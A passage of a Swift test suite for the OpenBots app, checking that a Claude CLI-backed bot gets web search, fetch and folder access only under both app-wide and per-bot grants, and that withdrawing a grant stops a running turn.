import Foundation
import OpenBotsContent
import OpenBotsDomain
@testable import OpenBotsPersistence
@testable import OpenBotsRuntime
@testable import OpenBotsServices
import Testing

/// The product already promised one rule: a web capability works only when the
/// app-wide master switch AND that bot's own grant are both on. These tests
/// prove an ordinary chat turn now obeys exactly that rule, and that a turn
/// without both switches is byte-for-byte the turn that shipped.
@Suite("Web grants reaching an ordinary text turn")
struct ClaudeTextReplyWebGrantTests {
    @Test("A bot without Work launches reading the shared folder and its skills, and is told so; a bot with Work launches as before")
    func everyBotReads() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let shared = f.directory.appendingPathComponent("Shared")
        let read = try ClaudeTextReadAccess(sharedDirectoryURL: shared, protectedPaths: [])
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: WebGrantReadAccess(read: read, work: nil), target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.last)
        #expect(request.readAccess == read && request.grantedToolNames == ["Glob", "Grep", "Read"])
        #expect(request.systemPrompt.contains("The team's shared folder is \(shared.path)."))
        let desk = f.directory.appendingPathComponent("Bots/Yogurt")
        let work = try ClaudeTextWorkAccess(workingDirectoryURL: desk, sharedDirectoryURL: shared, protectedPaths: [])
        let worker = WebGrantRunner()
        let working = f.service(store, runner: worker, access: WebGrantReadAccess(read: read, work: work), target: try f.target())
        #expect(await working.sendText(f.submission()) { _ in }.outcome == .completed)
        let workRequest = try #require(await worker.requests.last)
        #expect(workRequest.readAccess == nil && workRequest.workAccess == work)
    }

    @Test("A question about a read on a turn that reads beside a connector is refused with a sentence that is true of that bot: it reads only the shared folder and its skills")
    func aReadQuestionBesideAConnectorIsRefusedTruthfully() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let read = try ClaudeTextReadAccess(sharedDirectoryURL: f.directory.appendingPathComponent("Shared"), protectedPaths: [])
        for tool in ["Read", "Glob", "Grep"] {
            let runner = ReadQuestionRunner(toolName: tool)
            let service = f.service(store, runner: runner, access: ReadingBrowserAccess(read: read), target: try f.target())
            #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
            #expect(await runner.requests.first?.grantsReading == true)
            let denial = await runner.denial
            #expect(denial == "This bot reads only the team's shared folder and its own skills.", "\(tool)")
        }
        // A bot with the connector and no reading keeps the browsing sentence.
        let runner = ReadQuestionRunner(toolName: "Read")
        let service = f.service(store, runner: runner, access: ReadingBrowserAccess(read: nil), target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let denial = await runner.denial
        #expect(denial == "This bot can browse, but cannot use that tool.")
    }

    @Test("A teammate granted both switches answers with both web tools and a prompt that names them")
    func bothSwitchesGrantBothTools() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        for capability in [AgenticCapability.web(.search), .web(.fetch)] {
            await access.setAppEnabled(true, capability: capability)
            await access.setBotEnabled(true, capability: capability, teammateID: f.teammateID)
        }
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.allowedTools == [.webSearch, .webFetch])
        #expect(request.allowedToolNames == ["WebSearch", "WebFetch"])
        // The turn must be told the truth about what it can do.
        #expect(request.systemPrompt.contains("WebSearch, to search the public web"))
        #expect(request.systemPrompt.contains("WebFetch, to read a public web page you name"))
        #expect(!request.systemPrompt.contains("No tools, filesystem access,"))
        #expect(!request.systemPrompt.contains("No tools, file access,"))
        #expect(request.systemPrompt.contains("Nothing beyond these tools is available to you."))
        // And the command must carry exactly those two tools.
        let arguments = ClaudeTextOnlyCommandBuilder.arguments(for: request)
        #expect(arguments.contains("--allowedTools"))
        let tools = try #require(arguments.firstIndex(of: "--tools").map { arguments[$0 + 1] })
        #expect(tools == "WebSearch,WebFetch")
        let turns = try #require(arguments.firstIndex(of: "--max-turns").map { arguments[$0 + 1] })
        #expect(turns == "16")
    }

    @Test("One switch on either side grants nothing at all",
          arguments: [(true, false), (false, true), (false, false)])
    func oneSwitchGrantsNothing(_ state: (app: Bool, bot: Bool)) async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        if state.app { await access.setAppEnabled(true, capability: .web(.search)) }
        if state.bot { await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID) }
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.allowedTools.isEmpty)
        #expect(ClaudeTextOnlyCommandBuilder.arguments(for: request) == f.shippedArguments(request))
    }

    @Test("Each capability is granted on its own and never implies the other")
    func capabilitiesAreIndependent() async throws {
        for (capability, expected) in [(AgenticWebCapability.search, ClaudeTextOnlyTool.webSearch),
                                       (.fetch, .webFetch)] {
            let f = try WebGrantFixture()
            defer { f.remove() }
            let store = try f.open()
            try await f.seed(store)
            let access = AgenticJobAccessStore()
            await access.setAppEnabled(true, capability: .web(capability))
            await access.setBotEnabled(true, capability: .web(capability), teammateID: f.teammateID)
            // The job switch is irrelevant to a conversation and must stay so.
            await access.setAppEnabled(true)
            await access.setBotEnabled(true, teammateID: f.teammateID)
            let runner = WebGrantRunner()
            let service = f.service(store, runner: runner, access: access, target: try f.target())
            #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
            let request = try #require(await runner.requests.first)
            #expect(request.allowedTools == [expected])
        }
    }

    @Test("A bot's grant belongs to that bot alone")
    func grantsAreNotSharedBetweenBots() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let otherBot = TeammateID(UUID()), otherChat = ConversationID(UUID())
        try await f.seed(store, teammateID: otherBot, conversationID: otherChat)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        #expect(await service.sendText(.init(conversationID: otherChat, teammateID: otherBot,
            userMessageID: MessageID(UUID()), text: "A question from the ungranted bot.")) { _ in }.outcome == .completed)
        let requests = await runner.requests
        #expect(requests.count == 2)
        #expect(requests[0].allowedTools == [.webSearch])
        #expect(requests[1].allowedTools.isEmpty)
        #expect(ClaudeTextOnlyCommandBuilder.arguments(for: requests[1]) == f.shippedArguments(requests[1]))
    }

    @Test("A service with no access dependency produces exactly the turn that shipped")
    func unwiredServiceIsUnchanged() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: nil, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.allowedTools.isEmpty)
        #expect(request.systemPrompt.contains("No tools, file access,"))
        #expect(ClaudeTextOnlyCommandBuilder.arguments(for: request) == f.shippedArguments(request))
    }

    @Test("The granted prompt replaces the denial in both prompt sources and keeps the ungranted wording exact")
    func grantedPromptCorrectsBothSources() throws {
        // The seam prompt, as the service writes it for an unassembled turn.
        let seam = """
            You are Yogurt, a named teammate in OpenBots.
            Role: Research
            \(OfficialClaudeTextReplyService.seamNoToolsSentence) Do not claim
            to have performed actions outside this conversation. Do not invent earlier context.
            """
        // The assembled prompt, as production writes it.
        let assembled = """
            You are a named teammate in OpenBots. The complete user-approved profile follows.
            \(OfficialClaudeTextReplyService.assembledNoToolsSentence) Never claim to
            have performed an external action or changed saved memory.
            """
        for prompt in [seam, assembled] {
            // No grant changes nothing at all.
            #expect(OfficialClaudeTextReplyService.grantedToolsPrompt(prompt, tools: []) == prompt)
            let corrected = OfficialClaudeTextReplyService.grantedToolsPrompt(prompt, tools: [.webSearch])
            #expect(!corrected.contains("No tools, file access,"))
            #expect(!corrected.contains("No tools, filesystem access,"))
            #expect(corrected.contains("may use the tools named below"))
            #expect(corrected.contains("WebSearch, to search the public web"))
            #expect(!corrected.contains("WebFetch"))
            // The replacement is hard-wrapped, so the sentence is read unwrapped.
            let unwrapped = corrected.split(whereSeparator: \.isWhitespace).joined(separator: " ")
            #expect(unwrapped.contains("no shell or code execution"))
            #expect(unwrapped.contains("no browser automation"))
            #expect(unwrapped.contains("no connectors"))
        }
        // A prompt whose denial was reworded still gets the truthful paragraph.
        let reworded = OfficialClaudeTextReplyService.grantedToolsPrompt(
            "You are a teammate. Nothing at all is available.", tools: [.webFetch])
        #expect(reworded.contains("WebFetch, to read a public web page you name"))
    }

    @Test("The sentence the granted prompt replaces is still the one the production assembler writes")
    func assembledDenialSentenceIsStillTheRealOne() async throws {
        // The live chat path never uses the seam prompt: production always wires
        // the assembler. If its wording drifts, the replacement would silently
        // stop firing and a granted bot would be told again that it has nothing.
        let f = try WebGrantFixture()
        defer { f.remove() }
        let teammate = try f.teammate()
        let assembled = try await ClaudeContextAssemblyService(memoryReader: { _, _ in
            Issue.record("A profile-only assembly must read no memory")
            return ""
        }).assemble(ClaudeContextAssemblyInput(teammate: teammate, currentText: "A question.",
            snapshot: f.emptySnapshot(teammate)))
        #expect(assembled.systemPrompt.contains(OfficialClaudeTextReplyService.assembledNoToolsSentence))
        // Ungranted, it is left exactly as the assembler wrote it.
        #expect(OfficialClaudeTextReplyService.grantedToolsPrompt(assembled.systemPrompt, tools: [])
            == assembled.systemPrompt)
        // Granted, that sentence is gone and the tools are named.
        let corrected = OfficialClaudeTextReplyService.grantedToolsPrompt(assembled.systemPrompt,
            tools: [.webSearch, .webFetch])
        #expect(!corrected.contains(OfficialClaudeTextReplyService.assembledNoToolsSentence))
        #expect(corrected.contains("WebSearch, to search the public web"))
        #expect(corrected.contains("WebFetch, to read a public web page you name"))
    }
}

// MARK: - Fixture

private actor WebGrantRunner: ClaudeTextOnlyRunning {
    private(set) var requests: [ClaudeTextOnlyRequest] = []
    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        requests.append(request)
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
            actualModel: request.expectedResolvedModel, text: "A complete reply.",
            confirmedActualModel: request.expectedResolvedModel))
    }
}

private struct WebGrantPreparer: ClaudeTextLaunchPreparing {
    let target: ClaudeConnectionTarget
    func prepareTextLaunch(runID: UUID) async -> ClaudeTextLaunchPreparation { .ready(target) }
}

private struct WebGrantFixture: Sendable {
    let directory: URL
    let protection: ProtectionDecisionReceipt
    let teammateID = TeammateID(UUID()), conversationID = ConversationID(UUID())
    let appOwner = UUID()
    let date = Date(timeIntervalSince1970: 4_000)

    init() throws {
        directory = URL(fileURLWithPath: "/private/tmp/OpenBotsNextWebGrant-\(UUID()).noindex", isDirectory: true)
        protection = try ProtectionDecisionReceipt(decisionID: UUID(), selectedAt: Date(), rationaleVersion: 2)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: false,
            attributes: [.posixPermissions: 0o700])
    }

    func remove() { try? FileManager.default.removeItem(at: directory) }

    func open() throws -> SQLiteStore {
        try SQLiteStore(configuration: SQLiteStoreConfiguration(
            fileURL: directory.appendingPathComponent("control.sqlite"),
            protection: .ordinarySQLite(decision: protection)))
    }

    func seed(_ store: SQLiteStore, teammateID selected: TeammateID? = nil,
              conversationID selectedChat: ConversationID? = nil) async throws {
        let botID = selected ?? teammateID, chatID = selectedChat ?? conversationID
        // Two bots never share a name, and the store now refuses a second one.
        let name = botID == teammateID ? "Yogurt" : "Yogurt \(botID.persistedValue.prefix(8))"
        let teammate = try Teammate(id: botID,
            profile: TeammateProfile(displayName: name, role: "Research", detailedInstructions: nil),
            appearance: AgentAppearance(mode: .creature, grammarVersion: 1, deterministicSeed: 6,
                silhouette: "round", paletteToken: "sky", eyeDialect: "bright",
                nonColorIdentityCue: "single crest", accessibleIdentityDescription: "Round creature with a crest"),
            createdAt: date, updatedAt: date)
        try await store.provisionDirectChat(teammate: teammate,
            conversation: Conversation(id: chatID, kind: .direct(teammateID: botID), createdAt: date, updatedAt: date),
            fixtureGreeting: nil, selectConversation: false)
    }

    /// The same profile the seeded bot carries, for a direct assembler call.
    func teammate() throws -> Teammate {
        try Teammate(id: teammateID,
            profile: TeammateProfile(displayName: "Yogurt", role: "Research", detailedInstructions: nil),
            appearance: AgentAppearance(mode: .creature, grammarVersion: 1, deterministicSeed: 6,
                silhouette: "round", paletteToken: "sky", eyeDialect: "bright",
                nonColorIdentityCue: "single crest", accessibleIdentityDescription: "Round creature with a crest"),
            createdAt: date, updatedAt: date)
    }

    /// A profile-only assembly: no prior messages, no memory, nothing to read.
    func emptySnapshot(_ teammate: Teammate) -> ReadContextSnapshot {
        ReadContextSnapshot(receipt: ReadContextReceipt(conversationID: conversationID,
            teammateID: teammate.id, profileRevision: teammate.profile.revision, contextRevision: 1,
            selectedProjectID: nil, selectedTeamID: nil, participantJoinedAt: date,
            projectMembershipJoinedAt: nil, teamMembershipJoinedAt: nil,
            messages: [], memoryDocuments: []),
            recentMessages: [], olderMessages: [], memoryDocuments: [], omissions: ReadContextOmissions())
    }

    func submission() -> ClaudeTextTurnSubmission {
        ClaudeTextTurnSubmission(conversationID: conversationID, teammateID: teammateID,
            userMessageID: MessageID(UUID()), text: "Research what changed in Swift 6 this month.")
    }

    func target() throws -> ClaudeConnectionTarget {
        try ClaudeConnectionTarget(executableURL: URL(fileURLWithPath: "/fixture/claude"),
            expectedExecutableSHA256: String(repeating: "a", count: 64),
            profileURL: URL(fileURLWithPath: "/fixture/WebGrant.noindex/CLIProfile"),
            workingDirectoryURL: URL(fileURLWithPath: "/fixture/WebGrant.noindex/Work"),
            temporaryDirectoryURL: URL(fileURLWithPath: "/fixture/WebGrant.noindex/Temp"),
            homeDirectoryURL: URL(fileURLWithPath: "/fixture"))
    }

    /// `repository` stands in front of the store when a test needs to see the
    /// writes; the store itself does every other job.
    func service(_ store: SQLiteStore, runner: any ClaudeTextOnlyRunning,
                 access: (any ClaudeTextReplyWebAccessResolving)?,
                 target: ClaudeConnectionTarget, clock: any OpenBotsClock = SystemClock(),
                 repository: (any TextTurnRepository)? = nil,
                 chromeTabs: any ChromeTabDirectory = FixtureChrome(open: false),
                 sessions: SQLiteStore? = nil, transcripts: Set<UUID> = []) -> OfficialClaudeTextReplyService {
        OfficialClaudeTextReplyService(repository: repository ?? store, teammates: store, conversations: store,
            messages: store, preparer: WebGrantPreparer(target: target), runner: runner,
            appOwnerID: appOwner, clock: clock, webAccess: access, sessions: sessions, resumesSessions: sessions != nil,
            sessionTranscriptExists: { _, id in transcripts.contains(id) },
            sessionTranscriptRemove: { _, _ in ClaudeSessionTranscriptRemoval(removedPaths: [], droppedHistoryLines: 0) },
            chromeTabs: chromeTabs)
    }

    /// The tool-free command exactly as it first shipped, written
    /// out here rather than derived, so a change to the builder cannot quietly
    /// redefine what "unchanged" means.
    func shippedArguments(_ request: ClaudeTextOnlyRequest) -> [String] {
        ["--print", "--input-format", "stream-json", "--output-format", "stream-json",
         "--include-partial-messages", "--replay-user-messages", "--verbose", "--safe-mode", "--restricted",
         "--no-session-persistence", "--no-chrome", "--disable-slash-commands", "--strict-mcp-config",
         "--mcp-config", "{\"mcpServers\":{}}", "--settings",
         "{\"disableAllHooks\":true,\"disableClaudeAiConnectors\":true,\"enableArtifact\":false,\"enabledPlugins\":{\"agents-md@builtin\":false},"
            + "\"syncClaudeAiSkills\":false,\"switchModelsOnFlag\":false,"
            + "\"permissions\":{\"defaultMode\":\"dontAsk\",\"deny\":[\"*\"]}}",
         "--setting-sources", "", "--permission-mode", "dontAsk", "--tools", "", "--disallowedTools", "*",
         "--model", request.launchModel, "--max-turns", "1",
         "--session-id", request.sessionID.uuidString.lowercased(),
         "--system-prompt-file", request.target.temporaryDirectoryURL
            .appendingPathComponent("openbots-system-prompt-\(request.runID.uuidString.lowercased()).txt").path]
    }
}

/// A runner that holds the turn open until the test releases it, so a switch
/// can be flipped while the child is still running.
private actor HeldWebGrantRunner: ClaudeTextOnlyRunning {
    private(set) var requests: [ClaudeTextOnlyRequest] = []
    private(set) var wasCancelled = false
    private var isRunning = false

    /// Resumes once the child has begun, so a test never flips a switch before
    /// the turn it means to interrupt exists.
    func waitUntilRunning() async {
        // Bounded: if the service ever stops reaching the runner, these tests
        // must fail on their own assertions rather than hang the suite.
        for _ in 0..<150 where !isRunning {
            try? await Task.sleep(for: .milliseconds(20))
        }
    }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        requests.append(request)
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        isRunning = true
        // The real transport ends when its child does; this one ends when the
        // service cancels it, which is exactly what a withdrawn grant must do.
        // It also gives up on its own after a bounded wait, so a service that
        // never cancels fails this test rather than hanging the suite.
        for _ in 0..<150 where !Task.isCancelled {
            try? await Task.sleep(for: .milliseconds(20))
        }
        guard Task.isCancelled else {
            return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
                actualModel: request.expectedResolvedModel, text: "Never interrupted.",
                confirmedActualModel: request.expectedResolvedModel))
        }
        wasCancelled = true
        return .cancelled
    }
}

/// Turning a web switch off blocks its pending and new operations. The
/// sample-folder job path has always obeyed
/// that — it re-reads access on every command and stops a run whose switch
/// moved. A conversation resolved its grant once at launch and kept it for the
/// life of the turn, so a bot went on searching after its user revoked the
/// switch. These pin the same rule on the reply path.
@Suite("A withdrawn grant stops the turn using it")
struct ClaudeTextReplyWebGrantWithdrawalTests {
    @Test("Turning the app-wide switch off stops a granted turn that is already running")
    func appSwitchOffStopsTheRunningTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        for capability in [AgenticCapability.web(.search), .web(.fetch)] {
            await access.setAppEnabled(true, capability: capability)
            await access.setBotEnabled(true, capability: capability, teammateID: f.teammateID)
        }
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        await access.setAppEnabled(false, capability: .web(.search))
        #expect(await outcome == .stopped)
        #expect(await runner.wasCancelled)
        #expect(await runner.requests.first?.allowedTools == [.webSearch, .webFetch])
    }

    @Test("Granting an extra capability mid-turn leaves the running turn alone")
    func anAdditionDoesNotStopTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        // The user gives this bot fetch as well, while it is mid-answer. It now
        // holds more than it launched with, which endangers nothing.
        await access.setAppEnabled(true, capability: .web(.fetch))
        await access.setBotEnabled(true, capability: .web(.fetch), teammateID: f.teammateID)
        try await Task.sleep(for: .milliseconds(150))
        #expect(await !runner.wasCancelled)
        // Taking the original one away still stops it.
        await access.setAppEnabled(false, capability: .web(.search))
        #expect(await outcome == .stopped)
    }

    @Test("A change that leaves the granted set alone does not disturb the turn")
    func anUnrelatedChangeLeavesTheTurnAlone() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        // Another bot's grant, and a capability this turn never had.
        await access.setBotEnabled(true, capability: .web(.fetch), teammateID: TeammateID(UUID()))
        try await Task.sleep(for: .milliseconds(120))
        #expect(await !runner.wasCancelled)
        await access.setAppEnabled(false, capability: .web(.search))
        #expect(await outcome == .stopped)
    }
}

/// A work turn's folders follow the rule the web switches set: a work turn is
/// launched with exactly the folders granted at that moment (one `--add-dir`
/// each), so taking one away while it runs invalidates the process still
/// holding it, the way turning a switch off does. The real switch store is
/// wired to the real workspace service here, as the app wires them.
@Suite("A folder taken away stops the turn working in it")
struct ClaudeTextReplyFolderWithdrawalTests {
    private struct Desk {
        let access: AgenticJobAccessStore
        let workspaces: BotWorkspaceService
        let folder: URL
        let folderID: UUID
    }

    /// Both work switches on, one folder added; nothing protected exists under
    /// the fixture's home, so the added folder is an ordinary one.
    private func desk(_ f: WebGrantFixture, store: SQLiteStore) async throws -> Desk {
        let layout = PreviewStorageLayout(homeDirectory: f.directory.appending(path: "home"),
            systemTemporaryDirectory: f.directory.appending(path: "tmp"))
        try FileManager.default.createDirectory(at: layout.homeDirectory, withIntermediateDirectories: true)
        let folder = f.directory.appending(path: "Invoices")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let workspaces = BotWorkspaceService(layout: layout, repository: store, teammates: store)
        let access = AgenticJobAccessStore()
        await access.configureWorkspaces(workspaces)
        await access.setAppEnabled(true, capability: .work)
        await access.setBotEnabled(true, capability: .work, teammateID: f.teammateID)
        let added = try await workspaces.addFolder(folder, teammateID: f.teammateID)
        return Desk(access: access, workspaces: workspaces, folder: folder, folderID: try #require(added.folders.first?.id))
    }

    @Test("Removing a folder the turn launched with stops it, and the next turn launches without that folder")
    func removingAFolderStopsTheRunningTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let desk = try await desk(f, store: store)
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: desk.access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        let launched = try #require(await runner.requests.first?.workAccess)
        #expect(launched.additionalDirectoryURLs.map(\.path) == [desk.folder.path])
        _ = try await desk.workspaces.removeFolder(id: desk.folderID, teammateID: f.teammateID)
        #expect(await outcome == .stopped)
        #expect(await runner.wasCancelled)
        // The record says what a switch turned off says: interrupted, not failed.
        let run = try #require(try await store.runs(conversationID: f.conversationID, limit: 1).first)
        #expect(run.state == .interrupted)
        // The next turn is launched with the folders that remain.
        let next = WebGrantRunner()
        let again = f.service(store, runner: next, access: desk.access, target: try f.target())
        #expect(await again.sendText(f.submission()) { _ in }.outcome == .completed)
        let relaunched = try #require(await next.requests.first?.workAccess)
        #expect(relaunched.additionalDirectoryURLs.isEmpty)
        #expect(relaunched.workingDirectoryURL == launched.workingDirectoryURL)
    }

    @Test("Adding a folder mid-turn leaves the running turn alone; taking the original one away still stops it")
    func addingAFolderDoesNotStopTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let desk = try await desk(f, store: store)
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: desk.access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        // More than it launched with endangers nothing; the new folder waits for the next turn.
        let more = f.directory.appending(path: "Receipts")
        try FileManager.default.createDirectory(at: more, withIntermediateDirectories: true)
        _ = try await desk.workspaces.addFolder(more, teammateID: f.teammateID)
        try await Task.sleep(for: .milliseconds(150))
        #expect(await !runner.wasCancelled)
        _ = try await desk.workspaces.removeFolder(id: desk.folderID, teammateID: f.teammateID)
        #expect(await outcome == .stopped)
        #expect(await runner.wasCancelled)
    }

    @Test("Turning the bot's own work switch off stops the running work turn")
    func workSwitchOffStopsTheRunningTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let desk = try await desk(f, store: store)
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: desk.access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        #expect(await runner.requests.first?.grantsWork == true)
        await desk.access.setBotEnabled(false, capability: .work, teammateID: f.teammateID)
        #expect(await outcome == .stopped)
        #expect(await runner.wasCancelled)
    }
}

/// An access adapter that revokes the grant in the window between the service
/// resolving it and the watcher subscribing — the race the watcher would
/// otherwise sleep through, because a switch moved before the subscription
/// exists produces no element to wake it.
private actor RaceWebAccess: ClaudeTextReplyWebAccessResolving {
    private var granted: Set<ClaudeTextOnlyTool>
    private(set) var reads = 0
    private let continuation: AsyncStream<Void>.Continuation
    private let stream: AsyncStream<Void>

    init(granted: Set<ClaudeTextOnlyTool>) {
        self.granted = granted
        var escaped: AsyncStream<Void>.Continuation!
        stream = AsyncStream { escaped = $0 }
        continuation = escaped
    }

    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> {
        reads += 1
        return granted
    }

    /// The revocation lands here, after the service read the grant and before
    /// the watcher is listening. Nothing is ever yielded on the stream.
    func webAccessChanges() async -> AsyncStream<Void> {
        granted = []
        return stream
    }
}

@Suite("A grant withdrawn before the watcher is listening")
struct ClaudeTextReplyWebGrantRaceTests {
    @Test("A switch flipped between the resolve and the subscription still stops the turn")
    func revocationInTheSubscriptionWindowStopsTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = RaceWebAccess(granted: [.webSearch, .webFetch])
        let runner = HeldWebGrantRunner()
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        // Stopped, not failed: a cancellation this early can catch a write in
        // flight, and the turn must still report the stop its user performed.
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .stopped)
        #expect(await runner.wasCancelled)
        // The turn still launched with what its user had granted at the time.
        #expect(await runner.requests.first?.allowedTools == [.webSearch, .webFetch])
    }
}

// MARK: - The CLI's own frames, through the real parser, into SQLite

/// The frames the 2.1.263 CLI writes for a granted turn, as read from the
/// binary: the model narrates, calls a
/// tool, gets its result, answers, and the result frame's text is the last
/// assistant message alone. Written here by hand, so the service is tested
/// against what the transport delivers, not against a runner's shortcut.
private enum WebGrantFrames {
    static func line(_ value: [String: Any]) throws -> Data {
        var data = try JSONSerialization.data(withJSONObject: value, options: [.sortedKeys])
        data.append(10)
        return data
    }

    static func opening(_ request: ClaudeTextOnlyRequest) throws -> Data {
        let session = request.sessionID.uuidString
        var data = try line(["type": "system", "subtype": "init", "session_id": session, "tools": request.allowedToolNames,
            "mcp_servers": [], "plugins": [], "permissionMode": "dontAsk", "apiKeySource": "none",
            "skills": [], "slash_commands": [], "agents": [], "output_style": "default",
            "model": request.expectedResolvedModel])
        data += try line(["type": "user", "uuid": request.messageID.uuidString, "session_id": session,
            "parent_tool_use_id": NSNull(), "isReplay": true,
            "message": ["role": "user", "content": [["type": "text", "text": request.text]]]])
        return data
    }

    static func event(_ request: ClaudeTextOnlyRequest, _ event: [String: Any]) throws -> Data {
        try line(["type": "stream_event", "session_id": request.sessionID.uuidString, "event": event])
    }

    static func messageStart(_ request: ClaudeTextOnlyRequest) throws -> Data {
        try event(request, ["type": "message_start",
            "message": ["role": "assistant", "model": request.expectedResolvedModel, "content": []]])
    }

    static func delta(_ request: ClaudeTextOnlyRequest, _ text: String) throws -> Data {
        try event(request, ["type": "content_block_delta", "index": 0, "delta": ["type": "text_delta", "text": text]])
    }

    /// One search: announced, stopped on, echoed in the full message, answered.
    static func searchRound(_ request: ClaudeTextOnlyRequest, id: String, narration: String) throws -> Data {
        let session = request.sessionID.uuidString
        var data = try event(request, ["type": "content_block_start", "index": 1,
            "content_block": ["type": "tool_use", "id": id, "name": "WebSearch", "input": [:]]])
        data += try event(request, ["type": "message_delta", "delta": ["stop_reason": "tool_use"]])
        data += try line(["type": "assistant", "session_id": session,
            "message": ["role": "assistant", "model": request.expectedResolvedModel,
                "content": [["type": "text", "text": narration],
                            ["type": "tool_use", "id": id, "name": "WebSearch", "input": ["query": "swift 6.2"]]]]])
        data += try line(["type": "user", "uuid": UUID().uuidString, "session_id": session, "parent_tool_use_id": NSNull(),
            "message": ["role": "user", "content": [["type": "tool_result", "tool_use_id": id, "content": "results"]]]])
        return data
    }

    static let narration = "Let me look that up."
    static let answer = "Swift 6.2 shipped on 2 September."

    static func roundTrip(_ request: ClaudeTextOnlyRequest) throws -> Data {
        var data = try opening(request)
        data += try messageStart(request)
        data += try delta(request, narration)
        data += try searchRound(request, id: "toolu_01", narration: narration)
        data += try messageStart(request)
        data += try delta(request, answer)
        data += try line(["type": "result", "subtype": "success", "session_id": request.sessionID.uuidString,
            "is_error": false, "result": answer,
            "modelUsage": [request.expectedResolvedModel: ["inputTokens": 10],
                           "claude-haiku-4-5-20251001": ["inputTokens": 3]]])
        return data
    }

    static func turnCap(_ request: ClaudeTextOnlyRequest) throws -> Data {
        var data = try opening(request)
        data += try messageStart(request)
        data += try delta(request, narration)
        data += try searchRound(request, id: "toolu_01", narration: narration)
        data += try line(["type": "result", "subtype": "error_max_turns", "session_id": request.sessionID.uuidString,
